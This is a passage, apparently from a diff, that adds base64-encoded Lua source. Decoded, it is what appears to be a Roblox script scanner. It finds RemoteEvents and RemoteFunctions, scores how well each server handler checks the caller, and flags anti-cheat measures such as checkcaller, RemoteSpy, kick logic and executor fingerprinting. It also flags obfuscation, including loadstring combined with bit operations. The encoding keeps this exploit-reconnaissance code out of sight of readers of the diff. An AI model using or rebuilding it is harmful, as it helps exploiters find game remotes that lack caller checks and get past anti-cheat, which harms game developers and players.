+'biBzcmM6Z21hdGNoKCJnYW1lJS4oWyV3X10rKTpXYWl0Rm9yQ2hpbGQlKFwiKFteXCJdKylcIiUpIikgZG8KICAgICAgICAgICAgclsiZ2FtZS4iIC4uIHN2',
+'YyAuLiAiOiIgLi4gbW9kXSA9IHRydWUKICAgICAgICBlbmQKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBmb3IgbG9hZCwgbW9kIGlu',
+'IHNyYzpnbWF0Y2goIihbJXdfXSspJVsoW1wiJ10pKFteXCInXSspXDIlXSIpIGRvCiAgICAgICAgICAgIGxvY2FsIGxvd2VyZWQgPSBtb2Q6bG93ZXIoKQog',
+'ICAgICAgICAgICBpZiBsb3dlcmVkOmZpbmQoIm1vZHVsZSIpIG9yIGxvd2VyZWQ6ZmluZCgic2NyaXB0Iikgb3IgbG93ZXJlZDpmaW5kKCJyZXF1aXJlIikg',
+'dGhlbgogICAgICAgICAgICAgICAgclttb2RdID0gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIHJldHVybiByCmVuZAoK',
+'bG9jYWwgZnVuY3Rpb24gZXh0cmFjdFRhZ3Moc3JjKQogICAgbG9jYWwgciA9IHt9CiAgICBpZiB0eXBlKHNyYykgfj0gInN0cmluZyIgb3IgI3NyYyA9PSAw',
+'IHRoZW4gcmV0dXJuIHIgZW5kCiAgICBwY2FsbChmdW5jdGlvbigpIGZvciB0YWcgaW4gc3JjOmdtYXRjaCgnW0FhXWRkVGFnJSgiKFteIl0qKSIlKScpIGRv',
+'IHJbdGFnXSA9IHRydWUgZW5kIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkgZm9yIHRhZyBpbiBzcmM6Z21hdGNoKCdbR2ddZXRUYWdnZWQlKCIoW14iXSop',
+'IiUpJykgZG8gclt0YWddID0gdHJ1ZSBlbmQgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKSBmb3IgdGFnIGluIHNyYzpnbWF0Y2goJ1tHZ11ldEluc3RhbmNl',
+'QWRkZWRTaWduYWwlKCIoW14iXSopIiUpJykgZG8gclt0YWddID0gdHJ1ZSBlbmQgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKSBmb3IgdGFnIGluIHNyYzpn',
+'bWF0Y2goJzpIYXNUYWclKCIoW14iXSopIiUpJykgZG8gclt0YWddID0gdHJ1ZSBlbmQgZW5kKQogICAgcmV0dXJuIHIKZW5kCgpsb2NhbCBmdW5jdGlvbiBl',
+'eHRyYWN0UmVtb3RlQ3JlYXRpb24oc3JjKQogICAgbG9jYWwgciA9IHt9CiAgICBpZiB0eXBlKHNyYykgfj0gInN0cmluZyIgb3IgI3NyYyA9PSAwIHRoZW4g',
+'cmV0dXJuIHIgZW5kCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgZm9yIHZhciwgcmNsYXNzIGluIHNyYzpnbWF0Y2goIihbJXdfXSspJXMqPSVzKklu',
+'c3RhbmNlJS5uZXclKFwiKFteXCJdKylcIiUpIikgZG8KICAgICAgICAgICAgaWYgcmNsYXNzID09ICJSZW1vdGVFdmVudCIgb3IgcmNsYXNzID09ICJSZW1v',
+'dGVGdW5jdGlvbiIgdGhlbgogICAgICAgICAgICAgICAgclsjcisxXSA9IHsgdmFyID0gdmFyLCBjbGFzcyA9IHJjbGFzcywgdHlwZSA9ICJleHBsaWNpdCIg',
+'fQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBmb3IgdmFyIGluIHNyYzpnbWF0Y2go',
+'IihbJXdfXSspJXMqPSVzKkluc3RhbmNlJS5uZXclKFwiUmVtb3RlJWErXCIlKSIpIGRvCiAgICAgICAgICAgIHJbI3IrMV0gPSB7IHZhciA9IHZhciwgY2xh',
+'c3MgPSAiUmVtb3RlKiIsIHR5cGUgPSAiZXhwbGljaXQiIH0KICAgICAgICBlbmQKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2Nh',
+'bCBzZWVuID0ge30KICAgICAgICBmb3Igcm5hbWUgaW4gc3JjOmdtYXRjaCgiSW5zdGFuY2UlLm5ldyUoXCJSZW1vdGUoWyVhXSspXCIlKSIpIGRvCiAgICAg',
+'ICAgICAgIGlmIG5vdCBzZWVuW3JuYW1lXSB0aGVuIHNlZW5bcm5hbWVdID0gdHJ1ZTsgclsjcisxXSA9IHsgdmFyID0gIkluc3RhbmNlIiwgY2xhc3MgPSAi',
+'UmVtb3RlIi4ucm5hbWUsIHR5cGUgPSAiYW5vbnltb3VzIiB9IGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAg',
+'IGZvciBhc3NpZ24gaW4gc3JjOmdtYXRjaCgiKFsld19dKyUuWyV3X10rKSVzKj0lcypJbnN0YW5jZSUubmV3JShcIlJlbW90ZSVhK1wiJSkiKSBkbwogICAg',
+'ICAgICAgICByWyNyKzFdID0geyB2YXIgPSBhc3NpZ24sIGNsYXNzID0gIlJlbW90ZUZpZWxkIiwgdHlwZSA9ICJmaWVsZCIgfQogICAgICAgIGVuZAogICAg',
+'ZW5kKQogICAgcmV0dXJuIHIKZW5kCgpsb2NhbCBmdW5jdGlvbiBleHRyYWN0RHluYW1pY1JlbW90ZVBhdHRlcm5zKHNyYykKICAgIGxvY2FsIHIgPSB7fQog',
+'ICAgaWYgdHlwZShzcmMpIH49ICJzdHJpbmciIG9yICNzcmMgPT0gMCB0aGVuIHJldHVybiByIGVuZAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGlm',
+'IHNyYzpmaW5kKCJfRyViW10iKSBvciBzcmM6ZmluZCgic2hhcmVkJWJbXSIpIG9yIHNyYzpmaW5kKCJnZXRmZW52IikgdGhlbgogICAgICAgICAgICByLmR5',
+'bmFtaWNUYWJsZSA9IHRydWUKICAgICAgICBlbmQKICAgICAgICBmb3IgY2FsbCwgZmFyZ3MgaW4gc3JjOmdtYXRjaCgiKFsld19dKyk6RmlyZVNlcnZlciVi',
+'KCkiKSBkbwogICAgICAgICAgICBsb2NhbCBhcmdzID0gZmFyZ3M6bWF0Y2goIl4lKCguKiklKSQiKSBvciAiIgogICAgICAgICAgICBpZiBhcmdzOmZpbmQo',
+'IiUuJS4iKSBvciBhcmdzOmZpbmQoInRvc3RyaW5nIikgdGhlbgogICAgICAgICAgICAgICAgci5keW5hbWljQ2FsbCA9IHRydWUKICAgICAgICAgICAgZW5k',
+'CiAgICAgICAgZW5kCiAgICAgICAgZm9yIHZhciwgaWR4IGluIHNyYzpnbWF0Y2goIihbJXdfXSspJVsoW14lXV0rKSVdIikgZG8KICAgICAgICAgICAgbG9j',
+'YWwgbG93ZXJlZCA9IGlkeDpsb3dlcigpCiAgICAgICAgICAgIGlmIGxvd2VyZWQ6ZmluZCgicmVtb3RlIikgb3IgbG93ZXJlZDpmaW5kKCJldmVudCIpIG9y',
+'IGxvd2VyZWQ6ZmluZCgiZnVuY3Rpb24iKSB0aGVuCiAgICAgICAgICAgICAgICByLmluZGV4ZWRBY2Nlc3MgPSB0cnVlCiAgICAgICAgICAgIGVuZAogICAg',
+'ICAgIGVuZAogICAgICAgIGZvciBfLCByY2xhc3MgaW4gaXBhaXJzKHsgIlJlbW90ZUV2ZW50IiwgIlJlbW90ZUZ1bmN0aW9uIiB9KSBkbwogICAgICAgICAg',
+'ICBmb3IgbWF0Y2ggaW4gc3JjOmdtYXRjaChyY2xhc3MgLi4gIiUubmV3IikgZG8KICAgICAgICAgICAgICAgIHIuY29uc3RydWN0b3JBY2Nlc3MgPSB0cnVl',
+'CiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgcmV0dXJuIHIKZW5kCgpsb2NhbCBmdW5jdGlvbiBleHRyYWN0U2hhcmVkVmFyQWNj',
+'ZXNzKHNyYywgcGF0aCkKICAgIGxvY2FsIHIgPSB7fQogICAgaWYgdHlwZShzcmMpIH49ICJzdHJpbmciIG9yICNzcmMgPT0gMCB0aGVuIHJldHVybiByIGVu',
+'ZAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciB2YXIgaW4gc3JjOmdtYXRjaCgiX0clLihbJXdfXSspIikgZG8KICAgICAgICAgICAgclsjcisx',
+'XSA9IHsgdmFyID0gdmFyLCB0eXBlID0gInJlYWQiIH0KICAgICAgICBlbmQKICAgICAgICBmb3IgdmFyIGluIHNyYzpnbWF0Y2goInNoYXJlZCUuKFsld19d',
+'KykiKSBkbwogICAgICAgICAgICByWyNyKzFdID0geyB2YXIgPSB2YXIsIHR5cGUgPSAicmVhZCIgfQogICAgICAgIGVuZAogICAgICAgIGZvciBrZXksIHZh',
+'bCBpbiBzcmM6Z21hdGNoKCJfRyVbW1wiJ10oWyV3X10rKVtcIiddJV0lcyo9JXMqKFteXG5dKykiKSBkbwogICAgICAgICAgICByWyNyKzFdID0geyB2YXIg',
+'PSBrZXksIHNuaXBwZXQgPSB0cnVuYyh2YWwsIDQwKSwgdHlwZSA9ICJ3cml0ZSIgfQogICAgICAgIGVuZAogICAgICAgIGZvciBrZXksIHZhbCBpbiBzcmM6',
+'Z21hdGNoKCJzaGFyZWQlW1tcIiddKFsld19dKylbXCInXSVdJXMqPSVzKihbXlxuXSspIikgZG8KICAgICAgICAgICAgclsjcisxXSA9IHsgdmFyID0ga2V5',
+'LCBzbmlwcGV0ID0gdHJ1bmModmFsLCA0MCksIHR5cGUgPSAid3JpdGUiIH0KICAgICAgICBlbmQKICAgIGVuZCkKICAgIHJldHVybiByCmVuZAoKbG9jYWwg',
+'ZnVuY3Rpb24gYW5hbHl6ZUF1dGgoc3JjKQogICAgbG9jYWwgcmVzdWx0ID0geyBzY29yZSA9IDAsIGNoZWNrcyA9IHt9IH0KICAgIGlmIHR5cGUoc3JjKSB+',
+'PSAic3RyaW5nIiBvciAjc3JjID09IDAgdGhlbiByZXR1cm4gcmVzdWx0IGVuZAogICAgaWYgc3JjOmZpbmQoIlVzZXJJZCIpIHRoZW4gcmVzdWx0LnNjb3Jl',
+'ID0gcmVzdWx0LnNjb3JlICsgMjsgcmVzdWx0LmNoZWNrc1sjcmVzdWx0LmNoZWNrcysxXSA9ICJVc2VySWQiIGVuZAogICAgaWYgc3JjOmZpbmQoInR5cGVv',
+'ZiIpIHRoZW4gcmVzdWx0LnNjb3JlID0gcmVzdWx0LnNjb3JlICsgMTsgcmVzdWx0LmNoZWNrc1sjcmVzdWx0LmNoZWNrcysxXSA9ICJ0eXBlb2YiIGVuZAog',
+'ICAgaWYgc3JjOmZpbmQoIklzQSIpIHRoZW4gcmVzdWx0LnNjb3JlID0gcmVzdWx0LnNjb3JlICsgMTsgcmVzdWx0LmNoZWNrc1sjcmVzdWx0LmNoZWNrcysx',
+'XSA9ICJJc0EiIGVuZAogICAgaWYgc3JjOmZpbmQoIkNoYXJhY3RlciIpIHRoZW4gcmVzdWx0LnNjb3JlID0gcmVzdWx0LnNjb3JlICsgMTsgcmVzdWx0LmNo',
+'ZWNrc1sjcmVzdWx0LmNoZWNrcysxXSA9ICJDaGFyYWN0ZXIiIGVuZAogICAgaWYgc3JjOmZpbmQoIkdldFBsYXllckZyb21DaGFyYWN0ZXIiKSB0aGVuIHJl',
+'c3VsdC5zY29yZSA9IHJlc3VsdC5zY29yZSArIDE7IHJlc3VsdC5jaGVja3NbI3Jlc3VsdC5jaGVja3MrMV0gPSAiR2V0UGxheWVyRnJvbUNoYXJhY3RlciIg',
+'ZW5kCiAgICBpZiBzcmM6ZmluZCgiQWRtaW4iKSBvciBzcmM6ZmluZCgiYWRtaW4iKSB0aGVuIHJlc3VsdC5jaGVja3NbI3Jlc3VsdC5jaGVja3MrMV0gPSAi',
+'QWRtaW5LZXl3b3JkIiBlbmQKICAgIGlmIHNyYzpmaW5kKCJPd25lciIpIG9yIHNyYzpmaW5kKCJvd25lciIpIHRoZW4gcmVzdWx0LmNoZWNrc1sjcmVzdWx0',
+'LmNoZWNrcysxXSA9ICJPd25lcktleXdvcmQiIGVuZAogICAgaWYgc3JjOmZpbmQoIkJhbiIpIHRoZW4gcmVzdWx0LmNoZWNrc1sjcmVzdWx0LmNoZWNrcysx',
+'XSA9ICJCYW5LZXl3b3JkIiBlbmQKICAgIHJldHVybiByZXN1bHQKZW5kCgpsb2NhbCBmdW5jdGlvbiBidWlsZENyb3NzUmVmZXJlbmNlKHNjcmlwdHMpCiAg',
+'ICBsb2NhbCBoYW5kbGVycyA9IHt9CiAgICBsb2NhbCBjYWxsZXJMb29rdXAgPSB7fQogICAgZm9yIF8sIHYgaW4gaXBhaXJzKHNjcmlwdHMpIGRvCiAgICAg',
+'ICAgaWYgdi5zcmMgYW5kICN2LnNyYyA+IDAgdGhlbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgcmVtb3RlTmFt',
+'ZSwgcGFyYW1zIGluIHYuc3JjOmdtYXRjaCgiKFsld18lLl0rKSUuT25TZXJ2ZXJFdmVudDpDb25uZWN0JSgoW14pXSopJSkiKSBkbwogICAgICAgICAgICAg',
+'ICAgICAgIGlmIG5vdCBoYW5kbGVyc1tyZW1vdGVOYW1lXSB0aGVuIGhhbmRsZXJzW3JlbW90ZU5hbWVdID0ge30gZW5kCiAgICAgICAgICAgICAgICAgICAg',
+'aGFuZGxlcnNbcmVtb3RlTmFtZV1bI2hhbmRsZXJzW3JlbW90ZU5hbWVdKzFdID0gewogICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRQYXRoID0gdi5w',
+'YXRoLCBoYW5kbGVyVHlwZSA9ICJPblNlcnZlckV2ZW50IiwKICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zID0gdHJ1bmMocGFyYW1zLCA0MCksIGF1',
+'dGggPSBhbmFseXplQXV0aCh2LnNyYykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAg',
+'ICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgcmVtb3RlTmFtZSwgcGFyYW1zIGluIHYuc3JjOmdtYXRjaCgiKFsld18lLl0rKSUu',
+'RXZlbnQ6Q29ubmVjdCUoKFteKV0qKSUpIikgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgaGFuZGxlcnNbcmVtb3RlTmFtZV0gdGhlbiBoYW5kbGVy',
+'c1tyZW1vdGVOYW1lXSA9IHt9IGVuZAogICAgICAgICAgICAgICAgICAgIGhhbmRsZXJzW3JlbW90ZU5hbWVdWyNoYW5kbGVyc1tyZW1vdGVOYW1lXSsxXSA9',
+'IHsKICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0UGF0aCA9IHYucGF0aCwgaGFuZGxlclR5cGUgPSAiRXZlbnQ6Q29ubmVjdCIsCiAgICAgICAgICAg',
+'ICAgICAgICAgICAgIHBhcmFtcyA9IHRydW5jKHBhcmFtcywgNDApLCBhdXRoID0gYW5hbHl6ZUF1dGgodi5zcmMpCiAgICAgICAgICAgICAgICAgICAgfQog',
+'ICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZm9yIHJlbW90',
+'ZU5hbWUsIHBhcmFtcyBpbiB2LnNyYzpnbWF0Y2goIihbJXdfJS5dKyklLk9uSW52b2tlOkNvbm5lY3QlKChbXildKiklKSIpIGRvCiAgICAgICAgICAgICAg',
+'ICAgICAgaWYgbm90IGhhbmRsZXJzW3JlbW90ZU5hbWVdIHRoZW4gaGFuZGxlcnNbcmVtb3RlTmFtZV0gPSB7fSBlbmQKICAgICAgICAgICAgICAgICAgICBo',
+'YW5kbGVyc1tyZW1vdGVOYW1lXVsjaGFuZGxlcnNbcmVtb3RlTmFtZV0rMV0gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdFBhdGggPSB2LnBh',
+'dGgsIGhhbmRsZXJUeXBlID0gIk9uSW52b2tlIiwKICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zID0gdHJ1bmMocGFyYW1zLCA0MCksIGF1dGggPSBh',
+'bmFseXplQXV0aCh2LnNyYykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAog',
+'ICAgZW5kCiAgICBmb3IgXywgdiBpbiBpcGFpcnMoc2NyaXB0cykgZG8KICAgICAgICBpZiB2LnJlbW90ZUNhbGxzIHRoZW4KICAgICAgICAgICAgZm9yIF8s',
+'IHJjIGluIGlwYWlycyh2LnJlbW90ZUNhbGxzKSBkbwogICAgICAgICAgICAgICAgbG9jYWwgbWF0Y2hlZEhhbmRsZXJzID0gaGFuZGxlcnNbcmMucmVtb3Rl',
+'XQogICAgICAgICAgICAgICAgaWYgbWF0Y2hlZEhhbmRsZXJzIHRoZW4KICAgICAgICAgICAgICAgICAgICByYy5oYW5kbGVycyA9IG1hdGNoZWRIYW5kbGVy',
+'cwogICAgICAgICAgICAgICAgICAgIHJjLm1heEF1dGggPSAwCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGggaW4gaXBhaXJzKG1hdGNoZWRIYW5kbGVy',
+'cykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgaC5hdXRoLnNjb3JlID4gcmMubWF4QXV0aCB0aGVuIHJjLm1heEF1dGggPSBoLmF1dGguc2NvcmUg',
+'ZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcmMuaGFzQXV0aCA9IHJjLm1heEF1dGggPj0gMgogICAgICAgICAgICAg',
+'ICAgZW5kCiAgICAgICAgICAgICAgICBpZiBub3QgY2FsbGVyTG9va3VwW3JjLnJlbW90ZV0gdGhlbiBjYWxsZXJMb29rdXBbcmMucmVtb3RlXSA9IHt9IGVu',
+'ZAogICAgICAgICAgICAgICAgY2FsbGVyTG9va3VwW3JjLnJlbW90ZV1bI2NhbGxlckxvb2t1cFtyYy5yZW1vdGVdKzFdID0gewogICAgICAgICAgICAgICAg',
+'ICAgIHNjcmlwdFBhdGggPSB2LnBhdGgsIGNhbGxUeXBlID0gcmMudHlwZSwgYXJncyA9IHJjLmFyZ3MKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAg',
+'ZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGZvciBybmFtZSwgaGxpc3QgaW4gcGFpcnMoaGFuZGxlcnMpIGRvCiAgICAgICAgZm9yIF8sIGggaW4gaXBh',
+'aXJzKGhsaXN0KSBkbwogICAgICAgICAgICBoLmNhbGxlcnMgPSBjYWxsZXJMb29rdXBbcm5hbWVdIG9yIHt9CiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJl',
+'dHVybiBoYW5kbGVycwplbmQKCmxvY2FsIGZ1bmN0aW9uIGRldGVjdEFudGlDaGVhdChzcmMpCiAgICBsb2NhbCByID0ge30KICAgIGlmIHR5cGUoc3JjKSB+',
+'PSAic3RyaW5nIiBvciAjc3JjID09IDAgdGhlbiByZXR1cm4gciBlbmQKICAgIGlmIHNyYzpmaW5kKCJSZW1vdGVTcHkiKSBvciBzcmM6ZmluZCgicmVtb3Rl',
+'c3B5IikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiSElHSCIsIGRlc2MgPSAiUmVtb3RlU3B5IGRldGVjdGlvbiIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJL',
+'aWNrJXMqJSguKlBsYXllciIpIG9yIHNyYzpmaW5kKCJraWNrJXMqJSguKlBsYXllciIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0g',
+'IktpY2sgb24gcGxheWVyIGNoZWNrIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoIndoaXRlbGlzdCIpIG9yIHNyYzpmaW5kKCJXaGl0ZUxpc3QiKSBvciBzcmM6',
+'ZmluZCgiV2hpdGVsaXN0IikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJXaGl0ZWxpc3QgY2hlY2sgcHJlc2VudCIgfSBlbmQK',
+'ICAgIGlmIHNyYzpmaW5kKCJjaGVja2NhbGxlciIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkNSSVRJQ0FMIiwgZGVzYyA9ICJjaGVja2NhbGxlciBhbnRp',
+'LWV4cGxvaXQiIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgicHJvdGVjdGd1aSIpIG9yIHNyYzpmaW5kKCJwcm90ZWN0X2luc3RhbmNlIikgdGhlbiByWyNyKzFd',
+'ID0geyBsdmwgPSAiTUVESVVNIiwgZGVzYyA9ICJFeGVjdXRvciBwcm90ZWN0aW9uIGNhbGxzIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoImdldGh1aSIpIHRo',
+'ZW4gclsjcisxXSA9IHsgbHZsID0gIkxPVyIsIGRlc2MgPSAiZ2V0aHVpIHVzYWdlIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoIkh0dHBHZXQiKSBhbmQgc3Jj',
+'OmZpbmQoIndlYmhvb2siKSB0aGVuIHJbI3IrMV0gPSB7IGx2bCA9ICJISUdIIiwgZGVzYyA9ICJXZWJob29rIGNhbGxiYWNrIGluIGNvZGUiIH0gZW5kCiAg',
+'ICBpZiBzcmM6ZmluZCgiX19uYW1lY2FsbCIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkNSSVRJQ0FMIiwgZGVzYyA9ICJfX25hbWVjYWxsIGhvb2sgLSBy',
+'ZW1vdGUgZGV0ZWN0aW9uIiB9IGVuZAogICAgaWYgc3JjOmZpbmQoIkZpcmVTZXJ2ZXIiKSBhbmQgKHNyYzpmaW5kKCJLaWNrIikgb3Igc3JjOmZpbmQoImtp',
+'Y2siKSkgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiQ1JJVElDQUwiLCBkZXNjID0gIlJlbW90ZSBjYWxsICsgS2ljayAoYW50aS1leHBsb2l0KSIgfSBlbmQK',
+'ICAgIGlmIHNyYzpmaW5kKCJzeW4lLiIpIG9yIHNyYzpmaW5kKCJzeW5fIikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiSElHSCIsIGRlc2MgPSAiU3luYXBz',
+'ZSBBUEkgdXNhZ2UiIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgiaWRlbnRpZnlleGVjdXRvciIpIG9yIHNyYzpmaW5kKCJnZXRleGVjdXRvcm5hbWUiKSB0aGVu',
+'IHJbI3IrMV0gPSB7IGx2bCA9ICJISUdIIiwgZGVzYyA9ICJFeGVjdXRvciBmaW5nZXJwcmludGluZyIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJnZXRjb25u',
+'ZWN0aW9ucyIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIkhJR0giLCBkZXNjID0gImdldGNvbm5lY3Rpb25zIC0gc2lnbmFsIGluc3BlY3Rpb24iIH0gZW5k',
+'CiAgICBpZiBzcmM6ZmluZCgiZ2V0Z2MiKSB0aGVuIHJbI3IrMV0gPSB7IGx2bCA9ICJNRURJVU0iLCBkZXNjID0gImdldGdjIC0gR0MgaW5zcGVjdGlvbiIg',
+'fSBlbmQKICAgIGlmIHNyYzpmaW5kKCJpc19zY3JpcHQiKSBvciBzcmM6ZmluZCgiaXNzY3JpcHQiKSB0aGVuIHJbI3IrMV0gPSB7IGx2bCA9ICJNRURJVU0i',
+'LCBkZXNjID0gIlNjcmlwdCBjb250ZXh0IGRldGVjdGlvbiIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJnZXRzY3JpcHRjbG9zdXJlIikgb3Igc3JjOmZpbmQo',
+'ImdldGNsb3N1cmUiKSB0aGVuIHJbI3IrMV0gPSB7IGx2bCA9ICJNRURJVU0iLCBkZXNjID0gIkNsb3N1cmUgZXh0cmFjdGlvbiIgfSBlbmQKICAgIGlmIHNy',
+'YzpmaW5kKCJnZXRzY3JpcHRieXRlY29kZSIpIG9yIHNyYzpmaW5kKCJnZXRieXRlY29kZSIpIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIk1FRElVTSIsIGRl',
+'c2MgPSAiQnl0ZWNvZGUgZXh0cmFjdGlvbiIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJnZXRzY3JpcHRoYXNoIikgdGhlbiByWyNyKzFdID0geyBsdmwgPSAi',
+'TE9XIiwgZGVzYyA9ICJTY3JpcHQgaGFzaCBjaGVja2luZyIgfSBlbmQKICAgIGlmIHNyYzpmaW5kKCJkZWNvbXBpbGUiKSB0aGVuIHJbI3IrMV0gPSB7IGx2',
+'bCA9ICJNRURJVU0iLCBkZXNjID0gImRlY29tcGlsZSBjYWxsIC0gYW50aS1kZWNvbXBpbGUiIH0gZW5kCiAgICByZXR1cm4gcgplbmQKCmxvY2FsIGZ1bmN0',
+'aW9uIGRldGVjdE9iZnVzY2F0aW9uKHNyYykKICAgIGxvY2FsIHIgPSB7fQogICAgaWYgdHlwZShzcmMpIH49ICJzdHJpbmciIG9yICNzcmMgPT0gMCB0aGVu',
+'IHJldHVybiByIGVuZAogICAgbG9jYWwgYmMgPSAwCiAgICBmb3IgXyBpbiBzcmM6Z21hdGNoKCJzdHJpbmclLmJ5dGUiKSBkbyBiYyA9IGJjICsgMSBlbmQK',
+'ICAgIGZvciBfIGluIHNyYzpnbWF0Y2goInN0cmluZyUuY2hhciIpIGRvIGJjID0gYmMgKyAxIGVuZAogICAgaWYgYmMgPj0gMyB0aGVuIHJbI3IrMV0gPSB7',
+'IGx2bCA9ICJISUdIIiwgZGVzYyA9ICJzdHJpbmcuYnl0ZS9jaGFyIGxvb3AgKG9iZnVzY2F0aW9uKSBjb3VudD0iIC4uIGJjIH0gZW5kCiAgICBsb2NhbCB4',
+'YyA9IDAKICAgIGZvciBfIGluIHNyYzpnbWF0Y2goImJpdDMyJS5ieG9yIikgZG8geGMgPSB4YyArIDEgZW5kCiAgICBmb3IgXyBpbiBzcmM6Z21hdGNoKCJi',
+'aXQlLmJ4b3IiKSBkbyB4YyA9IHhjICsgMSBlbmQKICAgIGlmIHhjID49IDIgdGhlbiByWyNyKzFdID0geyBsdmwgPSAiSElHSCIsIGRlc2MgPSAiYml0MzIv',
+'Yml0LmJ4b3IgdXNhZ2UgKG9iZnVzY2F0aW9uKSBjb3VudD0iIC4uIHhjIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgibG9hZHN0cmluZyIpIGFuZCAoc3JjOmZp',
+'bmQoInN0cmluZyUuYnl0ZSIpIG9yIHNyYzpmaW5kKCJzdHJpbmclLmNoYXIiKSBvciBzcmM6ZmluZCgiYml0MzIiKSkgdGhlbgogICAgICAgIHJbI3IrMV0g',
+'PSB7IGx2bCA9ICJDUklUSUNBTCIsIGRlc2MgPSAibG9hZHN0cmluZyArIGJ5dGUvYml0IG9wcyAoc2VsZi1kZWNyeXB0KSIgfQogICAgZW5kCiAgICBpZiBz',
+'cmM6ZmluZCgiZ2V0ZmVudiIpIGFuZCBzcmM6ZmluZCgibG9hZCIpIHRoZW4KICAgICAgICByWyNyKzFdID0geyBsdmwgPSAiQ1JJVElDQUwiLCBkZXNjID0g',
+'ImdldGZlbnYgKyBsb2FkIChzYW5kYm94IGVzY2FwZSArIG9iZnVzY2F0aW9uKSIgfQogICAgZW5kCiAgICBsb2NhbCBoYyA9IDAKICAgIGZvciBfIGluIHNy',
+'YzpnbWF0Y2goImJhc2U2NCIpIGRvIGhjID0gaGMgKyAxIGVuZAogICAgZm9yIF8gaW4gc3JjOmdtYXRjaCgic2hhMzg0IikgZG8gaGMgPSBoYyArIDEgZW5k',
+'CiAgICBmb3IgXyBpbiBzcmM6Z21hdGNoKCJzaGEyNTYiKSBkbyBoYyA9IGhjICsgMSBlbmQKICAgIGZvciBfIGluIHNyYzpnbWF0Y2goIm1kNSIpIGRvIGhj',
+'ID0gaGMgKyAxIGVuZAogICAgZm9yIF8gaW4gc3JjOmdtYXRjaCgic2hhMyIpIGRvIGhjID0gaGMgKyAxIGVuZAogICAgZm9yIF8gaW4gc3JjOmdtYXRjaCgi',
+'eHhoYXNoIikgZG8gaGMgPSBoYyArIDEgZW5kCiAgICBpZiBoYyA+PSAxIHRoZW4gclsjcisxXSA9IHsgbHZsID0gIk1FRElVTSIsIGRlc2MgPSAiQ3J5cHRv',
+'L2hhc2ggZnVuY3Rpb25zIChhbnRpLXRhbXBlcikiIH0gZW5kCiAgICBpZiBzcmM6ZmluZCgidGFibGUlLmNvbmNhdCIpIGFuZCAoc3JjOmZpbmQoInN0cmlu',
+'ZyUucmVwIikgb3Igc3JjOmZpbmQoInN0cmluZyUuc3ViIikpIHRoZW4KICAgICAgICByWyNyKzFdID0geyBsdmwgPSAiTE9XIiwgZGVzYyA9ICJTdHJpbmcg',
+'YXNzZW1ibHkgcGF0dGVybiIgfQogICAgZW5kCiAgICBsb2NhbCBlYyA9IDAKICAgIGZvciBfIGluIHNyYzpnbWF0Y2goInN0cmluZyUucmV2ZXJzZSIpIGRv',
+'IGVjID0gZWMgKyAxIGVuZAogICAgZm9yIF8gaW4gc3JjOmdtYXRjaCgic3RyaW5nJS5nc3ViIikgZG8gZWMgPSBlYyArIDEgZW5kCiAgICBmb3IgXyBpbiBz',
